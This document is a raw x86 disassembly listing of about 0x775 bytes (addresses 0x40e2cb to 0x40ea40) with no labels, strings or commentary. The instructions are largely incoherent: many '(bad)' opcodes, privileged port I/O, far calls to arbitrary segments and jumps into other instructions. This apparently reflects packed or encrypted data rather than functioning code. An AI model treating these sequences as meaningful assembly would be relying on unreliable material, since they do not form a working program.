  40e2cb:	xor    ah,BYTE PTR [edi-0x11]
  40e2ce:	fcom   DWORD PTR [edi+0x1b]
  40e2d1:	adc    ch,al
  40e2d3:	pusha  
  40e2d4:	iret   
  40e2d5:	(bad)  
  40e2d6:	add    BYTE PTR [eax-0x56],ch
  40e2d9:	pop    edx
  40e2da:	mov    dh,0x15
  40e2dc:	nop
  40e2dd:	adc    al,0xfb
  40e2df:	mov    esp,ebp
  40e2e1:	pusha  
  40e2e2:	mov    dl,0xb5
  40e2e4:	das    
  40e2e5:	cld    
  40e2e6:	xor    eax,0x72b5e776
  40e2eb:	neg    BYTE PTR [edx+eiz*2-0x76]
  40e2ef:	push   ebx
  40e2f0:	adc    ah,BYTE PTR [esi+0x28]
  40e2f3:	cmp    eax,0x97c1ee3f
  40e2f8:	sbb    BYTE PTR [eax-0x11fbbbf9],0x4e
  40e2ff:	jl     0x40e300
  40e301:	jns    0x40e2d1
  40e303:	in     eax,dx
  40e304:	add    eax,0x99be1232
  40e309:	sbb    BYTE PTR [ecx+0x5ab5a3e8],bh
  40e30f:	fstp   DWORD PTR [edi-0x3]
  40e312:	repz sbb eax,0x8b5e9676
  40e318:	jecxz  0x40e377
  40e31a:	cdq    
  40e31b:	imul   bl
  40e31d:	pop    edi
  40e31e:	rol    ecx,cl
  40e320:	in     al,dx
  40e321:	jno    0x40e2fe
  40e323:	out    dx,eax
  40e324:	aam    0x8d
  40e326:	sub    DWORD PTR [ebp+0x7401873f],esi
  40e32c:	fld    TBYTE PTR [ecx]
  40e32e:	and    DWORD PTR [eax-0x78],edi
  40e331:	div    DWORD PTR [edx]
  40e333:	or     edx,DWORD PTR [ebx]
  40e335:	push   ebp
  40e336:	sbb    eax,0x1448475
  40e33b:	ret    
  40e33c:	pop    ss
  40e33d:	idiv   al
  40e33f:	mov    al,ds:0x5150ce53
  40e344:	or     DWORD PTR [eax],ebp
  40e346:	fisubr WORD PTR [ebp+0x5a]
  40e349:	add    ch,BYTE PTR [esi+0x4aa18dd5]
  40e34f:	idiv   BYTE PTR [esi]
  40e351:	gs jp  0x40e30c
  40e354:	jp     0x40e3b2
  40e356:	sbb    DWORD PTR [ebp-0x35173d07],ecx
  40e35c:	retf   0xc7b6
  40e35f:	xchg   ebp,eax
  40e360:	sub    DWORD PTR [ebp+0x75],eax
  40e363:	mov    cl,0x62
  40e365:	call   0x9048:0x36162ac7
  40e36c:	cmp    BYTE PTR [ebx],0x16
  40e36f:	cli    
  40e370:	or     BYTE PTR [eax-0x73],bh
  40e373:	scas   al,BYTE PTR es:[edi]
  40e374:	mov    cl,0x7f
  40e376:	hlt    
  40e377:	sti    
  40e378:	dec    esi
  40e379:	push   0x44
  40e37b:	fmul   QWORD PTR [edx]
  40e37d:	and    DWORD PTR [ebp-0x3c],ebp
  40e380:	xchg   esp,eax
  40e381:	mov    edx,0x25a914cd
  40e386:	xlat   BYTE PTR ds:[ebx]
  40e387:	mov    eax,ds:0xfbc2a3a
  40e38c:	pushf  
  40e38d:	pop    es
  40e38e:	push   ss
  40e38f:	ss push eax
  40e391:	dec    esi
  40e392:	pop    esi
  40e393:	daa    
  40e394:	std    
  40e395:	stos   DWORD PTR es:[edi],eax
  40e396:	shr    DWORD PTR [ecx],1
  40e398:	mov    eax,0x839c2516
  40e39d:	dec    edi
  40e39e:	sub    bh,BYTE PTR [ecx-0x6c052f7e]
  40e3a4:	xor    ebx,esi
  40e3a6:	hlt    
  40e3a7:	xor    ebx,DWORD PTR [eax+0x55dae659]
  40e3ad:	ror    BYTE PTR [eax],cl
  40e3af:	repnz fnstcw WORD PTR [esi]
  40e3b2:	ret    
  40e3b3:	xchg   esp,eax
  40e3b4:	(bad)  
  40e3b5:	inc    BYTE PTR [eax+0x12195ef]
  40e3bb:	add    eax,0x8edf7716
  40e3c0:	cld    
  40e3c1:	rcl    edi,1
  40e3c3:	outs   dx,DWORD PTR ds:[esi]
  40e3c4:	sbb    DWORD PTR [ebx-0x4f1ebd41],ebx
  40e3ca:	and    bl,BYTE PTR [edi+0x158020de]
  40e3d0:	and    al,0xcd
  40e3d2:	push   edx
  40e3d3:	(bad)  
  40e3d4:	addr16 loopne 0x40e3fe
  40e3d7:	sar    BYTE PTR [esi-0x77a1a146],1
  40e3dd:	mov    DWORD PTR [ebx],0x9c59041a
  40e3e3:	mov    esp,0x940fc1be
  40e3e8:	lock into 
  40e3ea:	pushf  
  40e3eb:	hlt    
  40e3ec:	mov    ebp,0x93a30b2f
  40e3f1:	popa   
  40e3f2:	scas   eax,DWORD PTR es:[edi]
  40e3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3f4:	les    eax,FWORD PTR [edx]
  40e3f6:	mov    ecx,0x8b29192f
  40e3fb:	dec    ecx
  40e3fc:	sub    BYTE PTR [esi-0x18127d66],bh
  40e402:	loop   0x40e46a
  40e404:	rcl    DWORD PTR [ecx+ebx*4-0x16ad35e],cl
  40e40b:	mov    cl,cl
  40e40d:	adc    al,0xcb
  40e40f:	inc    ecx
  40e410:	sub    esi,0x7d
  40e413:	push   eax
  40e414:	push   ebp
  40e415:	out    0x5d,eax
  40e417:	add    eax,0x1235de82
  40e41c:	xor    DWORD PTR [ecx+edi*1+0xb82b912],eax
  40e423:	mov    eax,ds:0x5fe0ac26
  40e428:	or     edi,DWORD PTR [edi]
  40e42a:	call   0xfdfd:0x6817fb65
  40e431:	lahf   
  40e432:	cld    
  40e433:	pop    ecx
  40e434:	sbb    eax,0x9aae6422
  40e439:	ins    BYTE PTR es:[edi],dx
  40e43a:	jge    0x40e3f6
  40e43c:	das    
  40e43d:	stc    
  40e43e:	sbb    al,0x58
  40e440:	mov    BYTE PTR [ebx],dh
  40e442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e443:	adc    dl,dh
  40e445:	ja     0x40e411
  40e447:	scas   al,BYTE PTR es:[edi]
  40e448:	inc    esp
  40e449:	add    al,0xb
  40e44b:	mov    ebx,0xc0864515
  40e450:	sbb    al,0xeb
  40e452:	dec    edx
  40e453:	cmp    dh,0xa2
  40e456:	pop    eax
  40e457:	pop    ecx
  40e458:	mov    ecx,0x95df942e
  40e45d:	in     eax,dx
  40e45e:	fcomp  QWORD PTR [ebx+0x4fabac58]
  40e464:	int    0x69
  40e466:	ret    
  40e467:	(bad)  
  40e468:	(bad)  
  40e469:	lds    edi,FWORD PTR [ecx-0x300bd223]
  40e46f:	mov    bh,0xc
  40e471:	sbb    ebp,ebp
  40e473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e474:	add    bl,BYTE PTR [edi*1+0x2f7ddef9]
  40e47b:	(bad)  
  40e47c:	js     0x40e4c8
  40e47e:	or     BYTE PTR [esi-0x4a1f523c],dh
  40e484:	adc    esp,DWORD PTR [esi+0x175c95a9]
  40e48a:	cmp    al,0x61
  40e48c:	or     al,BYTE PTR [eax]
  40e48e:	xor    al,0x2c
  40e490:	inc    edx
  40e491:	clc    
  40e492:	test   bl,dl
  40e494:	mov    ebx,0x2f6211ba
  40e499:	retf   
  40e49a:	jne    0x40e4ad
  40e49c:	stos   BYTE PTR es:[edi],al
  40e49d:	dec    edx
  40e49e:	push   eax
  40e49f:	sahf   
  40e4a0:	push   ebx
  40e4a1:	fsub   st,st(7)
  40e4a3:	or     eax,0x149b7254
  40e4a8:	inc    ebx
  40e4a9:	inc    esp
  40e4aa:	retf   
  40e4ab:	bound  ebp,QWORD PTR [edi+0x24d7624b]
  40e4b1:	gs jl  0x40e466
  40e4b4:	stos   BYTE PTR es:[edi],al
  40e4b5:	(bad)  
  40e4b6:	call   0xa99a2f1a
  40e4bb:	(bad)  
  40e4bc:	retf   
  40e4bd:	jge    0x40e4a9
  40e4bf:	pusha  
  40e4c0:	bound  esi,QWORD PTR [esi+0x10]
  40e4c3:	fdecstp 
  40e4c5:	out    0x9f,eax
  40e4c7:	xchg   esp,eax
  40e4c8:	jge    0x40e4ce
  40e4ca:	fs pop es
  40e4cc:	shl    DWORD PTR ss:[edx],0xf2
  40e4d0:	cmp    dh,dh
  40e4d2:	or     edi,0x2c0dc118
  40e4d8:	test   BYTE PTR [eax-0x57],al
  40e4db:	lods   eax,DWORD PTR ds:[esi]
  40e4dc:	(bad)  
  40e4dd:	or     edx,0xe25e4808
  40e4e3:	xor    DWORD PTR [ebp+0x5ce74d9],esp
  40e4e9:	jl     0x40e547
  40e4eb:	sahf   
  40e4ec:	jns    0x40e487
  40e4ee:	sub    BYTE PTR [edx+0xacfdf66],bh
  40e4f4:	in     al,0xc4
  40e4f6:	jg     0x40e4c1
  40e4f8:	aam    0x8f
  40e4fa:	aas    
  40e4fb:	ss daa 
  40e4fd:	xchg   BYTE PTR [ebx+0x43fc9a97],bl
  40e503:	or     DWORD PTR [ebx+0x526d9c1a],eax
  40e509:	jb     0x40e511
  40e50b:	jbe    0x40e566
  40e50d:	addr16 pop ecx
  40e50f:	sar    esi,0xb4
  40e512:	fist   WORD PTR [ecx-0x6b]
  40e515:	inc    ebp
  40e516:	js     0x40e516
  40e518:	sbb    al,bh
  40e51a:	fwait
  40e51b:	addr16 sahf 
  40e51d:	mov    ah,0x81
  40e51f:	and    BYTE PTR [eax],al
  40e521:	stos   BYTE PTR es:[edi],al
  40e522:	xchg   esp,eax
  40e523:	dec    edi
  40e524:	push   cs
  40e525:	xchg   ecx,eax
  40e526:	jp     0x40e53e
  40e528:	sub    bl,BYTE PTR [eax-0x1f91c95d]
  40e52e:	sbb    DWORD PTR [esi+0x4e],ebp
  40e531:	mov    eax,DWORD PTR [edi-0x1810dec5]
  40e537:	outs   dx,DWORD PTR ds:[esi]
  40e538:	xchg   BYTE PTR [ecx],dh
  40e53a:	shl    BYTE PTR [ecx-0x780ce872],cl
  40e540:	or     bh,0xe6
  40e543:	pop    edx
  40e544:	(bad)  
  40e545:	push   ds
  40e546:	cli    
  40e547:	xor    al,0x93
  40e549:	inc    esi
  40e54a:	pop    ss
  40e54b:	gs xchg edx,eax
  40e54d:	sub    eax,DWORD PTR [edx-0x1fc40053]
  40e553:	sbb    ebp,DWORD PTR [ebp-0x20cf599c]
  40e559:	aad    0x74
  40e55b:	xchg   edx,eax
  40e55c:	int    0x77
  40e55e:	xchg   ebx,eax
  40e55f:	add    BYTE PTR [eax],cl
  40e561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e562:	add    al,0x46
  40e564:	ret    0xd550
  40e567:	inc    esp
  40e568:	mov    esp,0x995441fd
  40e56d:	fsubr  DWORD PTR ds:0x7646d8eb
  40e574:	xchg   DWORD PTR [ebp+0x24],esp
  40e577:	add    eax,0x12da6f62
  40e57c:	jl     0x40e5e2
  40e57e:	and    BYTE PTR [ebp+0x7fdd6d40],ch
  40e584:	and    al,0xa
  40e586:	mov    dh,0x62
  40e588:	inc    ebp
  40e589:	nop
  40e58a:	sub    esp,DWORD PTR [esi+0x7fb883ee]
  40e590:	fwait
  40e591:	xchg   edx,eax
  40e592:	int    0x26
  40e594:	pop    ds
  40e595:	jp     0x40e5c4
  40e597:	and    al,0x5c
  40e599:	jnp    0x40e5f2
  40e59b:	add    BYTE PTR [ecx-0x47b70569],ch
  40e5a1:	(bad)  
  40e5a3:	shl    BYTE PTR [ebx+esi*2],0x45
  40e5a7:	pop    ss
  40e5a8:	push   esi
  40e5a9:	xor    dl,dl
  40e5ab:	inc    esi
  40e5ac:	ficomp DWORD PTR [esi+0x6d]
  40e5af:	aas    
  40e5b0:	inc    ebx
  40e5b1:	outs   dx,BYTE PTR ds:[esi]
  40e5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b4:	or     al,0x92
  40e5b6:	xor    al,BYTE PTR [eax+0x369bcf68]
  40e5bc:	sbb    DWORD PTR [eax],edx
  40e5be:	pop    esp
  40e5bf:	sbb    BYTE PTR ds:[esi],ch
  40e5c2:	iret   
  40e5c3:	mov    ebx,0xca772ddc
  40e5c8:	in     al,dx
  40e5c9:	in     eax,dx
  40e5ca:	mov    edx,0xa8d4aaf3
  40e5cf:	mov    fs,WORD PTR [esi]
  40e5d1:	or     DWORD PTR [ecx+0x56ca5985],ebp
  40e5d7:	fmul   QWORD PTR [eax+0x5511e5bb]
  40e5dd:	int    0x32
  40e5df:	mov    ds:0x8ccdeb7f,eax
  40e5e4:	cmp    eax,0xb687b4d2
  40e5e9:	pop    ebx
  40e5ea:	add    BYTE PTR [ecx],dl
  40e5ec:	cdq    
  40e5ed:	dec    esi
  40e5ee:	sub    dl,BYTE PTR [edx]
  40e5f0:	pop    ecx
  40e5f1:	das    
  40e5f2:	push   ss
  40e5f3:	xchg   DWORD PTR [eax-0x77],esi
  40e5f6:	sub    BYTE PTR [edx+eiz*8],ch
  40e5f9:	mov    ebx,0x895c2791
  40e5fe:	mov    dh,0xbd
  40e600:	jne    0x40e5e3
  40e602:	inc    edx
  40e603:	test   al,0xc8
  40e605:	adc    BYTE PTR [esi-0x4075d555],dh
  40e60b:	cmp    al,0x35
  40e60d:	push   ebx
  40e60e:	retf   0xa1a1
  40e611:	lods   al,BYTE PTR ds:[esi]
  40e612:	dec    esp
  40e613:	lods   al,BYTE PTR ds:[esi]
  40e614:	jmp    0x3743:0x338891e
  40e61b:	or     DWORD PTR [ebx],esp
  40e61d:	(bad)
  40e621:	aaa    
  40e622:	pop    ecx
  40e623:	aaa    
  40e624:	adc    bl,BYTE PTR [eax-0x46]
  40e627:	mov    ds:0x498e0c6c,al
  40e62c:	es xor al,0x63
  40e62f:	push   0xb1bb6bc2
  40e634:	mov    esi,0x92f30b47
  40e639:	sbb    BYTE PTR [esi-0x413cc949],dl
  40e63f:	add    al,0xf6
  40e641:	xor    edx,DWORD PTR [ebx-0x5c6ac5f5]
  40e647:	mov    cl,0xcf
  40e649:	neg    DWORD PTR [ebx]
  40e64b:	ins    DWORD PTR es:[edi],dx
  40e64c:	(bad)  
  40e64d:	jmp    0xa830:0x7124d300
  40e654:	push   0x2d
  40e656:	add    eax,0xc3de34e4
  40e65b:	xchg   ebx,eax
  40e65c:	sbb    DWORD PTR [esp+esi*4+0x7d4db7c4],ebx
  40e663:	mov    edx,0x8e1e8871
  40e668:	xlat   BYTE PTR ds:[ebx]
  40e669:	add    BYTE PTR [esi-0x3f],0x1a
  40e66d:	push   ss
  40e66e:	mov    gs,WORD PTR [eax-0x4458d098]
  40e674:	cmp    BYTE PTR [ebp-0x42ac5491],al
  40e67a:	inc    ebp
  40e67b:	sbb    eax,0xc047548e
  40e680:	jno    0x40e668
  40e682:	fwait
  40e683:	fs adc al,0x90
  40e686:	ds push 0x3eb64687
  40e68c:	add    ah,cl
  40e68e:	pop    eax
  40e68f:	(bad)  
  40e690:	jbe    0x40e674
  40e692:	sahf   
  40e693:	dec    edi
  40e694:	pop    ss
  40e695:	shl    BYTE PTR [ebx-0x67],0x14
  40e699:	clc    
  40e69a:	and    eax,0xef033d5d
  40e69f:	sbb    bh,BYTE PTR [edx+0x2e5091ff]
  40e6a5:	xor    al,0x40
  40e6a7:	jns    0x40e636
  40e6a9:	dec    esp
  40e6aa:	xchg   esp,eax
  40e6ab:	push   0xbc6edb64
  40e6b0:	mov    ch,0x25
  40e6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6b3:	push   es
  40e6b4:	and    ebp,DWORD PTR [edx-0x2fc9ec2d]
  40e6ba:	test   BYTE PTR [edx+0x50],bl
  40e6bd:	adc    al,0xaf
  40e6bf:	test   eax,0x129775cf
  40e6c4:	adc    edx,esi
  40e6c6:	push   0xee516168
  40e6cb:	mov    ebp,ebx
  40e6cd:	jmp    0x40e6b0
  40e6cf:	or     BYTE PTR [edi+eiz*1+0x3cdf87b0],dh
  40e6d6:	out    dx,al
  40e6d7:	stos   DWORD PTR es:[edi],eax
  40e6d8:	(bad)
  40e6dc:	xchg   ebp,eax
  40e6dd:	dec    DWORD PTR [edi]
  40e6df:	sub    al,0x91
  40e6e1:	adc    al,0x3b
  40e6e3:	dec    esp
  40e6e4:	jmp    0x807aeca8
  40e6e9:	sti    
  40e6ea:	out    0x1f,al
  40e6ec:	sahf   
  40e6ed:	fdiv   st,st(2)
  40e6ef:	loop   0x40e696
  40e6f1:	push   eax
  40e6f2:	fmul   DWORD PTR [ebp+eax*8+0x162e8305]
  40e6f9:	int    0x8
  40e6fb:	mul    BYTE PTR ds:0x6380d02d
  40e701:	lock in eax,0xab
  40e704:	lock sahf 
  40e706:	push   ds
  40e707:	gs jmp 0xcc53:0x7e7dccba
  40e70f:	cli    
  40e710:	ss mov edi,0xfea7ec3c
  40e716:	(bad)  
  40e717:	jb     0x40e710
  40e719:	arpl   WORD PTR [ecx],ax
  40e71b:	xor    eax,0x2b4d7eab
  40e720:	sub    esp,DWORD PTR [ebp+0x15b3e8e6]
  40e726:	out    dx,al
  40e727:	and    DWORD PTR [ebp-0x1795edeb],esp
  40e72d:	jecxz  0x40e6b8
  40e72f:	in     eax,dx
  40e730:	push   es
  40e731:	call   0x2957:0x58a6aab7
  40e738:	hlt    
  40e739:	ins    BYTE PTR es:[edi],dx
  40e73a:	mov    cl,0x86
  40e73c:	cmc    
  40e73d:	adc    al,0x73
  40e73f:	jae    0x40e745
  40e741:	adc    eax,0xfa7bcc59
  40e746:	out    0x15,eax
  40e748:	dec    ecx
  40e749:	xchg   ebx,eax
  40e74a:	dec    ecx
  40e74b:	push   edx
  40e74c:	cld    
  40e74d:	jae    0x40e742
  40e74f:	jne    0x40e76a
  40e751:	pop    ds
  40e752:	mov    ah,0x2c
  40e754:	nop
  40e755:	bound  eax,QWORD PTR [esi+0x5db87e75]
  40e75b:	in     al,dx
  40e75c:	rcl    BYTE PTR [ecx+0x7a],0x8e
  40e760:	mov    dl,0x75
  40e762:	jo     0x40e743
  40e764:	shl    ch,0x2f
  40e767:	retf   0xdf48
  40e76a:	push   cs
  40e76b:	es cmp eax,0x776e3626
  40e771:	jo     0x40e77c
  40e773:	inc    eax
  40e774:	cwde   
  40e775:	jmp    0x9a22:0xe7e044c8
  40e77c:	jae    0x40e7ac
  40e77e:	jg     0x40e715
  40e780:	mov    DWORD PTR [esp+eiz*2-0x75],ecx
  40e784:	adc    eax,0x2a1bfc3
  40e789:	mov    DWORD PTR [edx+eax*8],ecx
  40e78c:	pop    ebp
  40e78d:	rol    BYTE PTR [eax+0x18],cl
  40e790:	and    cl,BYTE PTR [edi+0x3b6428dd]
  40e796:	and    bh,BYTE PTR [ebx+0x1f]
  40e799:	mov    ch,0x29
  40e79b:	inc    edx
  40e79c:	adc    BYTE PTR [ebp-0xb],ah
  40e79f:	fwait
  40e7a0:	hlt    
  40e7a1:	inc    ebp
  40e7a2:	bound  eax,QWORD PTR ds:[ebp+eax*4-0x4b]
  40e7a7:	aaa    
  40e7a8:	jbe    0x40e7fe
  40e7aa:	pop    edx
  40e7ab:	(bad)  
  40e7ac:	std    
  40e7ad:	mov    edi,0xc7f9028
  40e7b2:	cmc    
  40e7b3:	mov    bh,0xfa
  40e7b5:	and    al,0xf9
  40e7b7:	push   0xffffffcc
  40e7b9:	cmp    eax,0x1c04be3a
  40e7be:	loop   0x40e7be
  40e7c0:	inc    esp
  40e7c1:	fwait
  40e7c2:	xor    dh,BYTE PTR [esi+ecx*8+0x20aacbff]
  40e7c9:	dec    esi
  40e7ca:	pop    es
  40e7cb:	ja     0x40e7fd
  40e7cd:	ucomiss xmm0,DWORD PTR [ebp-0x5cb1ad6d]
  40e7d4:	jmp    0x40e792
  40e7d6:	mov    ?,WORD PTR [ebx]
  40e7d8:	inc    esi
  40e7d9:	hlt    
  40e7da:	fld    DWORD PTR [eax+0x67353e7b]
  40e7e0:	jns    0x40e7a3
  40e7e2:	xchg   edx,eax
  40e7e3:	push   eax
  40e7e4:	in     eax,0xc7
  40e7e6:	loop   0x40e776
  40e7e8:	push   ebp
  40e7e9:	pop    esp
  40e7ea:	(bad)  
  40e7eb:	mov    edi,0x180c2bcb
  40e7f0:	mov    bl,BYTE PTR [edi+0x49]
  40e7f3:	jno    0x40e800
  40e7f5:	das    
  40e7f6:	fld    QWORD PTR [ecx+ecx*2]
  40e7f9:	or     ebp,esp
  40e7fb:	lock jno 0x40e875
  40e7fe:	xchg   ecx,eax
  40e7ff:	addr16 in al,dx
  40e801:	mov    ebp,0x50582e3
  40e806:	dec    edi
  40e807:	in     eax,0xa6
  40e809:	out    0x92,eax
  40e80b:	xor    al,0xc2
  40e80d:	outs   dx,DWORD PTR ds:[esi]
  40e80e:	mov    ebp,0x7cd0e2c3
  40e813:	mov    esp,DWORD PTR [ebp-0x16549d9d]
  40e819:	sub    DWORD PTR ds:0x5ce017eb,edi
  40e81f:	adc    al,BYTE PTR [ecx-0x1ff2d8c3]
  40e825:	jne    0x40e803
  40e827:	in     al,dx
  40e828:	lods   eax,DWORD PTR ds:[esi]
  40e829:	and    edx,DWORD PTR [ebx+0x64]
  40e82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e82d:	pop    ss
  40e82e:	and    cl,BYTE PTR [eax+0xc8aa6eb]
  40e834:	cmp    dl,bh
  40e836:	pop    ecx
  40e837:	call   0xdbf7:0xb72032ef
  40e83e:	fstp   TBYTE PTR [ebx-0x17]
  40e841:	inc    esp
  40e842:	retf   
  40e843:	daa    
  40e844:	add    ch,0x40
  40e847:	push   esi
  40e848:	fnstsw WORD PTR [ecx+0x3ea136da]
  40e84e:	sbb    BYTE PTR [eax-0x25],cl
  40e851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e852:	pop    es
  40e853:	mov    ecx,DWORD PTR fs:[ebx-0x41af1ddb]
  40e85a:	rcl    ecx,cl
  40e85c:	push   0xd41362d0
  40e861:	adc    BYTE PTR [edi-0x2ae8a7a5],ch
  40e867:	mov    edi,0x19ef4a74
  40e86c:	jno    0x40e807
  40e86e:	xor    ebp,DWORD PTR [esi-0x61]
  40e871:	fistp  QWORD PTR [edx]
  40e873:	xchg   edx,eax
  40e874:	xor    ah,0xd9
  40e877:	pop    es
  40e878:	push   es
  40e879:	sbb    ebp,DWORD PTR [edx+edx*4]
  40e87c:	push   eax
  40e87d:	sbb    BYTE PTR [edi+0x2e],0x27
  40e881:	sbb    bh,BYTE PTR [eax+0x60f7d007]
  40e887:	(bad)  
  40e888:	push   edi
  40e889:	adc    eax,0xbb3b9398
  40e88e:	pop    edx
  40e88f:	icebp  
  40e890:	and    ebp,esi
  40e892:	pop    es
  40e893:	mov    ebx,0x7794670a
  40e898:	and    BYTE PTR [ecx-0x43],ah
  40e89b:	mov    ah,0x30
  40e89d:	add    BYTE PTR [ecx],dl
  40e89f:	cmc    
  40e8a0:	sbb    dh,ah
  40e8a2:	nop
  40e8a3:	icebp  
  40e8a4:	jno    0x40e8dd
  40e8a6:	gs dec esi
  40e8a8:	sti    
  40e8a9:	pop    eax
  40e8aa:	sbb    BYTE PTR [ebx-0x17],bl
  40e8ad:	and    ebp,ebp
  40e8af:	xchg   esi,eax
  40e8b0:	aad    0x88
  40e8b2:	shr    DWORD PTR [eax+ecx*8+0x5a90c6b3],1
  40e8b9:	lahf   
  40e8ba:	add    dl,ch
  40e8bc:	xchg   DWORD PTR [eax+0x14],esi
  40e8bf:	xor    eax,0xf461bbc0
  40e8c4:	add    dh,BYTE PTR [ebp-0x57c0c5a0]
  40e8ca:	test   BYTE PTR [ebp-0x41685f4b],dl
  40e8d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8d1:	add    DWORD PTR ds:0x3e58a614,0xfffffff1
  40e8d8:	scas   al,BYTE PTR es:[edi]
  40e8d9:	ss call 0xb109:0x87942b39
  40e8e1:	aas    
  40e8e2:	idiv   DWORD PTR [esi+0x48c6fdee]
  40e8e8:	cmp    eax,0xffffff99
  40e8eb:	and    BYTE PTR [ebp+edi*4-0x7844c3f1],al
  40e8f2:	dec    edx
  40e8f3:	lock imul edx,eax,0xfffffff5
  40e8f7:	inc    esp
  40e8f8:	ss int3 
  40e8fa:	adc    eax,0x6497c6fc
  40e8ff:	div    DWORD PTR [ecx-0x2c]
  40e902:	sbb    dh,BYTE PTR [ecx]
  40e904:	dec    ebx
  40e905:	and    BYTE PTR [edx],ah
  40e907:	mov    ah,0x10
  40e909:	xor    al,0x95
  40e90b:	dec    ebx
  40e90c:	rol    DWORD PTR [ebp+0x29c3482c],cl
  40e912:	xor    bh,BYTE PTR [eax+0x74]
  40e915:	or     bl,BYTE PTR [ebx+edx*1]
  40e918:	inc    ebx
  40e919:	bound  ebx,QWORD PTR [esi-0x40]
  40e91c:	and    esp,DWORD PTR [edx]
  40e91e:	stos   BYTE PTR es:[edi],al
  40e91f:	xchg   edx,eax
  40e920:	into   
  40e921:	cmp    DWORD PTR [edi],esi
  40e923:	mov    ds:0xcb00f6ca,eax
  40e928:	loope  0x40e931
  40e92a:	mov    edx,0xfaa2f684
  40e92f:	and    al,BYTE PTR [ebx+0x17]
  40e932:	push   esp
  40e933:	shl    edi,1
  40e935:	out    0x3f,al
  40e937:	mov    ecx,0xebb4f853
  40e93c:	imul   esi,DWORD PTR [edx-0x34ded2fb],0xffffffbc
  40e943:	lods   al,BYTE PTR ss:[esi]
  40e945:	or     dl,ch
  40e947:	aam    0x11
  40e949:	pop    ds
  40e94a:	push   cs
  40e94b:	push   ebx
  40e94c:	and    DWORD PTR [edx-0x8210a93],ebx
  40e952:	dec    ebp
  40e953:	retf   
  40e954:	lds    esp,FWORD PTR [ecx]
  40e956:	int3   
  40e957:	pop    esi
  40e958:	dec    ebx
  40e959:	fimul  WORD PTR [edx-0x72a43f8]
  40e95f:	pop    edi
  40e960:	scas   al,BYTE PTR es:[edi]
  40e961:	sbb    bl,al
  40e963:	aaa    
  40e964:	xor    edx,DWORD PTR [eax]
  40e966:	ins    BYTE PTR es:[edi],dx
  40e967:	mov    ?,WORD PTR [ecx]
  40e969:	mov    ebx,0x780368eb
  40e96e:	inc    eax
  40e96f:	fidiv  WORD PTR [esp+ebp*2+0x79]
  40e973:	sub    ecx,ebx
  40e975:	sub    DWORD PTR [edi+0x19],esp
  40e978:	outs   dx,DWORD PTR ds:[esi]
  40e979:	addr16 (bad) 
  40e97b:	xor    al,0x8a
  40e97d:	jp     0x40e969
  40e97f:	idiv   ebx
  40e981:	jb     0x40e9e9
  40e983:	xchg   ebx,eax
  40e984:	scas   al,BYTE PTR es:[edi]
  40e985:	push   edx
  40e986:	scas   eax,DWORD PTR es:[edi]
  40e987:	dec    ebp
  40e988:	ins    DWORD PTR es:[edi],dx
  40e989:	dec    edi
  40e98a:	cmp    BYTE PTR [ecx],0xb3
  40e98d:	in     al,0x51
  40e98f:	xor    cl,BYTE PTR [ebp-0x792c3b37]
  40e995:	int3   
  40e996:	aas    
  40e997:	or     al,0xc0
  40e999:	out    0xd7,al
  40e99b:	or     al,0x5
  40e99d:	dec    edi
  40e99e:	loopne 0x40e9c9
  40e9a0:	lods   al,BYTE PTR ds:[esi]
  40e9a1:	sub    al,0x72
  40e9a3:	fisubr WORD PTR ds:0xc7ebb197
  40e9a9:	int3   
  40e9aa:	js     0x40e94a
  40e9ac:	je     0x40e9af
  40e9ae:	cmc    
  40e9af:	outs   dx,DWORD PTR ds:[esi]
  40e9b0:	cmp    ch,0xbf
  40e9b3:	mov    dh,0x8b
  40e9b5:	loop   0x40ea07
  40e9b7:	or     BYTE PTR [ecx],bl
  40e9b9:	cmp    DWORD PTR [edx],edx
  40e9bb:	(bad)  
  40e9bc:	sbb    DWORD PTR [edi],esi
  40e9be:	ss push edx
  40e9c0:	out    0x34,eax
  40e9c2:	pushf  
  40e9c3:	popa   
  40e9c4:	das    
  40e9c5:	(bad)  
  40e9c6:	(bad)  
  40e9c7:	xchg   esi,eax
  40e9c8:	adc    BYTE PTR [eax-0x91c817b],bl
  40e9ce:	(bad)  
  40e9cf:	mov    al,cl
  40e9d1:	(bad)  
  40e9d2:	call   0x16f8:0xd2378600
  40e9d9:	dec    esi
  40e9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9db:	pop    ss
  40e9dc:	repz dec ebx
  40e9de:	and    al,0xc9
  40e9e0:	pop    esp
  40e9e1:	fcmovbe st,st(3)
  40e9e3:	ror    BYTE PTR [esi+0x17],1
  40e9e6:	inc    esp
  40e9e7:	lahf   
  40e9e8:	sbb    DWORD PTR [edx+0x32a0f13d],0xffffff86
  40e9ef:	sub    eax,0xcc92a
  40e9f4:	push   es
  40e9f5:	sub    eax,DWORD PTR ds:0x1c40fc5e
  40e9fb:	das    
  40e9fc:	into   
  40e9fd:	shl    BYTE PTR [esi+ebx*4+0x501d1507],cl
  40ea04:	imul   edi,DWORD PTR [edx-0x3b],0x342005e2
  40ea0b:	nop
  40ea0c:	xor    BYTE PTR [eax-0x7d],dl
  40ea0f:	popf   
  40ea10:	or     edx,DWORD PTR [ebx-0x20]
  40ea13:	and    eax,0xb5f34792
  40ea18:	dec    edi
  40ea19:	dec    ebx
  40ea1a:	lods   eax,DWORD PTR es:[esi]
  40ea1c:	ins    DWORD PTR es:[edi],dx
  40ea1d:	fist   WORD PTR [esi]
  40ea1f:	sar    DWORD PTR [eax],1
  40ea21:	mov    ecx,0x2b64ea47
  40ea26:	or     eax,0x686f471f
  40ea2b:	dec    ecx
  40ea2c:	jecxz  0x40ea5e
  40ea2e:	jmp    0xeec4:0x19d8a8da
  40ea35:	popf   
  40ea36:	shl    DWORD PTR [edi+0x67],1
  40ea39:	and    ah,ch
  40ea3b:	inc    esi
  40ea3c:	stos   DWORD PTR es:[edi],eax
  40ea3d:	mov    ebx,DWORD PTR [ebp+0x72]
  40ea40:	(bad)  
